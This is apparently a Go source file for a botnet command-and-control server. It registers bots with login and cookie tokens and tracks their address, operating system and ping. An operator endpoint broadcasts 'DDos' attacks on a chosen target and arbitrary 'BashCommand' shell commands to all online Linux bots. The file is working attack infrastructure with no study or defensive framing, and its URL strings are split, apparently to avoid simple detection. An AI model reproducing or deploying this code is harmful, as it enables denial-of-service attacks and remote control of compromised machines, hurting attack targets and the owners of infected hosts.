package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	CookieFileName = "cookie.json"
	IdFileName     = "id.json"
	AuthFileName   = "login.json"
	AddressForFront = ":62328"
	AddressForBots = ":62323"
	CookieAlive = 30 * time.Second
	BotPingRange = 30 * time.Second
	BotPingDeadLine = 500 * time.Millisecond
)

type SafeMapStructure struct{
	mu sync.Mutex
	bMap botMap
	iMap idMap
}

type botMap = map[string]botStruct
type idMap  = map[int]string

type botStruct struct {
	Id                int       `json:"Id"`
	OperationSystem   string    `json:"OperationSystem"`
	Ping              string    `json:"Ping"`
	CommandExecStatus string    `json:"CommandExecStatus"`
	Status            string    `json:"Status"`
	UpdateCookie      string    `json:"UpdateCookie"`
	RemoteAddr        string    `json:"RemoteAddr"`
}

// -----------------------------------------------|Generators|----------------------------------------------------------

func CookieGenerator() string {
	return base64.StdEncoding.EncodeToString([]byte(strconv.FormatInt(time.Now().Add(CookieAlive).Unix(),10)))
}

// Unique id for bots
var uniqueId int
func (s *SafeMapStructure) NewId() int {
	for {
		uniqueId += 1
		s.mu.Lock()
		if _ ,ok := s.iMap[uniqueId]; !ok {
			s.mu.Unlock()
			return uniqueId
		} else {
			s.mu.Unlock()
		}
	}
}
// -----------------------------------------------|Write file|----------------------------------------------------------

func (s *SafeMapStructure) WriteBotMap() {
	s.mu.Lock()
	byteData, _ := json.MarshalIndent(s.bMap, "", "  ")
	s.mu.Unlock()
	_ = ioutil.WriteFile(CookieFileName, byteData, 0)
}

func (s *SafeMapStructure) WriteIdMap() {
	s.mu.Lock()
	byteData, _ := json.MarshalIndent(s.iMap, "", "  ")
	s.mu.Unlock()
	_ = ioutil.WriteFile(IdFileName, byteData, 0)
}

// -------------------------------------------------|Cookie|------------------------------------------------------------

func (s *SafeMapStructure) uploadCookie() error {
	file, err := ioutil.ReadFile(CookieFileName)
	if err != nil {
		return err
	}
	err = json.Unmarshal(file, &s.bMap)
	if err != nil {
		return err
	}
	file, err = ioutil.ReadFile(IdFileName)
	if err != nil {
		return err
	}
	err = json.Unmarshal(file, &s.iMap)
	if err != nil {
		return err
	}
	return nil
}

func (s *SafeMapStructure) NewCookieWriter(newCookie string, newUpdateCookie string) {
	id := s.NewId()
	newBot := botStruct{
		Id:                id,
		Status:            "Waiting connection",
		UpdateCookie:      newUpdateCookie,
	}
	s.mu.Lock()
	s.bMap[newCookie] = newBot
	s.iMap[id] = newCookie
	s.mu.Unlock()
	s.WriteBotMap()
	s.WriteIdMap()
}

// -------------------------------------------------|Options|-----------------------------------------------------------

var authMap = make(map[string]string)

type loginStruct struct {
	Login    string `json:"login"`
	Password string `json:"password"`
}

func uploadSettings() error {
	var loggingJsonFile []loginStruct
	file, err  := ioutil.ReadFile(AuthFileName)
	if err != nil {
		return err
	}
	err = json.Unmarshal(file, &loggingJsonFile)
	if err != nil {
		return err
	}
	for _, data := range loggingJsonFile {
		authMap[data.Login] = data.Password
	}
	return nil
}

// ------------------------------------------------|Mux1(Bots)|---------------------------------------------------------

type getCookieResponseStruct struct {
	Cookie       string `json:"cookie"`
	UpdateCookie string `json:"updateCookie"`
}

type getCookieRequestStruct struct {
	Login    string `json:"login"`
	Password string `json:"password"`
}

func (s *SafeMapStructure) getCookieBot(w http.ResponseWriter, r *http.Request) {
	var requestData getCookieRequestStruct
	_ = json.NewDecoder(r.Body).Decode(&requestData)
	_ = r.Body.Close()
	if requestData.Login != "" && requestData.Password != "" && authMap[requestData.Login] == requestData.Password {
		newCookie, newUpdateCookie := CookieGenerator(), CookieGenerator()
		response := getCookieResponseStruct{
			Cookie: newCookie,
			UpdateCookie: newUpdateCookie,
		}
		byteResponseData, _ := json.Marshal(response)
		_, err := w.Write(byteResponseData)
		if err == nil {
			s.NewCookieWriter(newCookie, newUpdateCookie)
		}
	} else {
		fmt.Println("-Failed attempt to get cookies")
	}
}

type connectBotRequestStruct struct {
	Cookie          string `json:"cookie"`
	UpdateCookie    string `json:"updateCookie"`
	OperationSystem string `json:"operationSystem"`
	ListeningPort   string `json:"listeningPort"`
}

type connectBotResponseStruct struct {
	Status    string `json:"status"`
	Info      string `json:"info"`
	NewCookie string `json:"newCookie"`

}

func (s *SafeMapStructure) connectBot(w http.ResponseWriter, r *http.Request) {
	var responseData connectBotResponseStruct
	var requestData connectBotRequestStruct
	err := json.NewDecoder(r.Body).Decode(&requestData)
	if err != nil {
		responseData.Status = "Error"
		response, _ := json.Marshal(responseData)
		_, _ = w.Write(response)
		return
	}
	_ = r.Body.Close()
	cookie := requestData.Cookie
	byteDate, _ := base64.StdEncoding.DecodeString(requestData.Cookie)
	expirationUnixDate, _  := strconv.ParseInt(string(byteDate), 10, 0)
	expirationDate := time.Unix(expirationUnixDate, 0)
	s.mu.Lock()
	if _, ok := s.bMap[requestData.Cookie]; ok {
		bot := s.bMap[requestData.Cookie]
		if expirationDate.Sub(time.Now()) > 0 {
			responseData.Status = "Connected"
			responseData.Info = "Ok"
			response, _ := json.Marshal(responseData)
			_, _ = w.Write(response)
		} else {
			responseData.Status = "Connected"
			responseData.Info = "NewCookie"
			responseData.NewCookie = CookieGenerator()
			delete(s.bMap, requestData.Cookie)
			s.bMap[responseData.NewCookie] = bot
			s.iMap[bot.Id] = responseData.NewCookie
			cookie = responseData.NewCookie
			response, _ := json.Marshal(responseData)
			_, _ = w.Write(response)
		}
		addr := r.RemoteAddr
		if addr[:5] == "[::1]" {
			addr = strings.ReplaceAll(addr, "[::1]", "127.0.0.1")
		}
		words := strings.Split(addr, ":")
		bot.RemoteAddr = words[0] + ":" + requestData.ListeningPort
		bot.Status = "online"
		bot.CommandExecStatus = "Waiting"
		bot.OperationSystem = requestData.OperationSystem
		s.bMap[cookie] = bot
		s.mu.Unlock()
		s.WriteBotMap()
		s.WriteIdMap()
		s.mu.Lock()
	} else {
		responseData.Status = "Error"
		responseData.Info = "BadCookie"
		response, _ := json.Marshal(responseData)
		_, _ = w.Write(response)
	}
	s.mu.Unlock()
}

type commandStatusBotStruct struct {
	Status string `json:"status"`
	Cookie string `json:"cookie"`
}

func (s *SafeMapStructure) commandStatusBot(_ http.ResponseWriter, r *http.Request) {
	var requestData commandStatusBotStruct
	_ = json.NewDecoder(r.Body).Decode(&requestData)
	_ = r.Body.Close()
	s.mu.Lock()
	bot := s.bMap[requestData.Cookie]
	bot.CommandExecStatus = requestData.Status
	s.bMap[requestData.Cookie] = bot
	s.mu.Unlock()
	s.WriteBotMap()
}
// ------------------------------------------------|Mux2(Front)|--------------------------------------------------------

type mainFrontRequestStruct struct {
	Action string `json:"action"`
}

type mainFrontResponseStruct struct {
	Bots [] mainFrontBotsStruct `json:"bots"`
}

type mainFrontBotsStruct struct {
	Id string `json:"id"`
	OperationSystem string `json:"OperationSystem"`
	Address string `json:"address"`
	Ping string `json:"ping"`
	CommandExecStatus string `json:"CommandExecStatus"`
	Status string `json:"status"`
}

func (s *SafeMapStructure) mainFront(w http.ResponseWriter, r *http.Request) {
	var requestData mainFrontRequestStruct
	_ = json.NewDecoder(r.Body).Decode(&requestData)
	_ = r.Body.Close()
	if requestData.Action == "clear" {
		s.mu.Lock()
		for i, j := range s.bMap {
			delete(s.bMap, i)
			delete(s.iMap, j.Id)
		}
		_ = ioutil.WriteFile(CookieFileName, []byte(nil), 0)
		_ = ioutil.WriteFile(IdFileName, []byte(nil), 0)
		s.mu.Unlock()
	} else if requestData.Action == "refresh" {
		var responseData mainFrontResponseStruct
		s.mu.Lock()
		for _, bot := range s.bMap {
			responseData.Bots = append(responseData.Bots, mainFrontBotsStruct{
				Id:                strconv.Itoa(bot.Id),
				OperationSystem:   bot.OperationSystem,
				Address:           bot.RemoteAddr,
				Ping:              bot.Ping,
				CommandExecStatus: bot.CommandExecStatus,
				Status:            bot.Status,
			})
		}
		s.mu.Unlock()
		fmt.Println(responseData)
		responseDataByte, _ := json.Marshal(responseData)
		_, _ = w.Write(responseDataByte)
	} else {
		fmt.Println("Ошибки на фронте. Непонятное действие: ", requestData.Action)
	}
}

type commandsFrontRequestStruct struct {
	Command string `json:"command"`
	Option  string `json:"option"`
}

type commandsFrontResponseStruct struct {
	Command string `json:"command"`
	Option  string `json:"option"`
}

func (s *SafeMapStructure) commandsFront(_ http.ResponseWriter, r *http.Request) {
	var requestData  commandsFrontRequestStruct
	var responseData commandsFrontResponseStruct
	_ = json.NewDecoder(r.Body).Decode(&requestData)
	_ = r.Body.Close()
	if requestData.Command == "DDos" {
		responseData.Command = "DDos"
		if requestData.Option == "127.0.0.1:" + AddressForFront || requestData.Option == "127.0.0.1:" + AddressForBots {
			fmt.Println("Try to DDos this server")
			return
		}
		responseData.Option = requestData.Option
		s.mu.Lock()
		for cook, bot := range s.bMap {
			if bot.Status == "online" {
				data, _ := json.Marshal(responseData)
				res := bytes.NewReader(data)
				resp, _ := http.Post("ht" + "tp://" + bot.RemoteAddr + "/action", "", res)
				if resp == nil {
					bot.Status = "offline"
					s.bMap[cook] = bot
					s.mu.Unlock()
					s.WriteBotMap()
					s.mu.Lock()
				}
			}
		}
		s.mu.Unlock()
		fmt.Println("Дудос пошел)")
	} else if requestData.Command == "BashCommand" {
		responseData.Command = "BashCommand"
		responseData.Option = requestData.Option
		s.mu.Lock()
		for cook, bot := range s.bMap {
			if bot.Status == "online" && bot.OperationSystem == "Linux" {
				data, _ := json.Marshal(responseData)
				res := bytes.NewReader(data)
				resp, _ := http.Post("ht" + "tp://" + bot.RemoteAddr + "/action", "", res)
				if resp == nil {
					bot.Status = "offline"
					s.bMap[cook] = bot
					s.mu.Unlock()
					s.WriteBotMap()
					s.mu.Lock()
				}
			}
		}
		s.mu.Unlock()
	} else {
		fmt.Println("Ошибки на фронте. Непонятная команда: ", requestData.Command)
	}
}

type kickFrontRequestStruct struct {
	Id string `json:"id"`
}
func (s *SafeMapStructure) kickFront(_ http.ResponseWriter, r *http.Request) {
	var requestData kickFrontRequestStruct
	_ = json.NewDecoder(r.Body).Decode(&requestData)
	_ = r.Body.Close()
	id, _ := strconv.Atoi(requestData.Id)
	s.mu.Lock()
	delete(s.bMap, s.iMap[id])
	delete(s.iMap, id)
	s.mu.Unlock()
	s.WriteBotMap()
	s.WriteIdMap()
}

// ---------------------------------------------------|ping|------------------------------------------------------------

func (s *SafeMapStructure) PingBots() {
	for cook, bot := range s.bMap {
		if bot.Status == "online" {
			var msgPingChannel = make(chan string)
			startTime := time.Now()

			go func() {
				resp, _ := http.Get("ht" + "tp://" + bot.RemoteAddr + "/ping")
				if resp != nil {
					body, _ := ioutil.ReadAll(resp.Body)
					fmt.Println(string(body), "-", bot.RemoteAddr)
					msgPingChannel <- string(body)
				}
			}()

			select {

			case <- msgPingChannel:
				bot.Ping = strconv.FormatInt((time.Now().Sub(startTime)).Milliseconds(), 10)
				fmt.Println(bot.Id, "<--->", bot.Ping)

			case <- time.Tick(BotPingDeadLine):
				bot.Status = "offline"
				bot.Ping = "---"

			}
			s.bMap[cook] = bot
			s.WriteBotMap()
		}
	}
}

// ---------------------------------------------------|main|------------------------------------------------------------

func main() {
	s := SafeMapStructure{
		mu:   sync.Mutex{},
		bMap: make(map[string]botStruct),
		iMap: make(map[int]string),
	}

	fmt.Println(">Starting server...")
    var err error

	// Uploading logins and passwords for bots
	err = uploadSettings()
	if err != nil {
		fmt.Println("-Error in settings file:", err.Error())
		return
	}
	fmt.Println(">Logins and passwords uploaded")

	// Uploading map of existing bots
	err = s.uploadCookie()
	if err != nil {
		if err.Error() == "unexpected end of JSON input"{
			fmt.Println(">Cookie file is empty")
		} else {
			fmt.Println("-Error in cookie file:", err.Error())
			return
		}
	} else {
		fmt.Println(">Bots uploaded")
	}

	go func() {
		mux1 := http.NewServeMux()
		mux1.HandleFunc("/bot/getCookie",     s.getCookieBot)
		mux1.HandleFunc("/bot/connect",       s.connectBot)
		mux1.HandleFunc("/bot/commandStatus", s.commandStatusBot)
		fmt.Println("-Bot mux error:", http.ListenAndServe(AddressForBots, mux1).Error())
	}()
	fmt.Println(">Listening Bots on port:", AddressForBots[1:])

	go func() {
		mux2 := http.NewServeMux()
		mux2.HandleFunc("/front/main",    s.mainFront)
		mux2.HandleFunc("/front/command", s.commandsFront)
		mux2.HandleFunc("/front/kick",    s.kickFront)
		fmt.Println("-Front mux error:", http.ListenAndServe(AddressForFront, mux2).Error())
	}()
	fmt.Println(">Listening Front on port:", AddressForFront[1:])

	for range time.Tick(BotPingRange){
		if len(s.bMap) >= 1 {
			s.PingBots()
		} else {
			fmt.Println("Waiting bots")
		}
	}
}
